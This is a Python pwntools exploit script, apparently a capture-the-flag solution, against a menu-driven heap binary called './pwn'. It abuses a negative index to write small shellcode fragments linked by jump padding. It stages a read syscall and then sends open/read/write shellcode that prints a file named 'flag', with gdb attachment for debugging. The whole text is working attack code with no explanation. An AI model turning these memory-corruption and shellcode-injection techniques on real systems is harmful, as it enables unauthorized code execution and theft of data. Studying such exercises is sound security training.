#!/usr/bin/python3
from pwn import *
#context.log_level = 'debug'
context(arch='amd64', os='linux')
#context(arch='i386', os='linux')
#context.terminal = ['tmux','splitw','-h']


elf = context.binary = ELF('./pwn')
libc = elf.libc
io = process("./pwn")

sl      = lambda s : io.sendline(s)
sa      = lambda delim,data : io.sendafter(str(delim), str(data))
sla     = lambda delim,data : io.sendlineafter(str(delim), str(data))
sn      = lambda s : io.send(s)
rc      = lambda n : io.recv(n)
rl      = lambda s : io.recvline(s)
#ru = lambda s : io.recvuntil(s)
ru      = lambda delim,drop=True : io.recvuntil(delim, drop)
uu32    = lambda data            : u32(data.ljust(4, '\x00'))
uu64    = lambda data            : u64(data.ljust(8, '\x00'))


def c(idx):
    sla("choice >>\n",idx)

def malloc(idx,size,data):
    c(1)
    sla("index:\n",idx)
    sla("size:\n",size)
    sa("content:\n",data)

def free(idx):
    c(4)
    sla("index:\n",idx)

def padding(s):
    context.log_level = 'info'
    s = asm(s)
    print(len(s))
    padding = '''jmp next\n''' + 'nop\n' * (0x20 + (8-len(s))-0xa) + 'next:'
    padding = s + asm(padding)
    context.log_level = 'debug'
    return padding[:8]
def add_shell(s):
    malloc(0,8,padding(s).decode("iso-8859-1"))

def bk():
    gdb.attach(io)
    input()


s = '''
xor eax,eax
push 0x70
pop rdx
'''
malloc(-25,8,padding(s).decode("iso-8859-1"))
add_shell('''
mov rsi,rdi
xor rdi,rdi
syscall
''')

s = 'nop\n' * 8 + '''mov rbp,rsi\n'''
s += shellcraft.amd64.open('flag')
s += shellcraft.amd64.read('rax','rbp',0x100)
s += shellcraft.amd64.write(1,'rbp',0x100)
s += shellcraft.amd64.write(1,'rbp',0x1000)
s += '''
\nnext:
jmp next'''
print(len(asm(s)))
print(s)
bk()
free(0)
bk()
io.send(asm(s))


io.interactive()
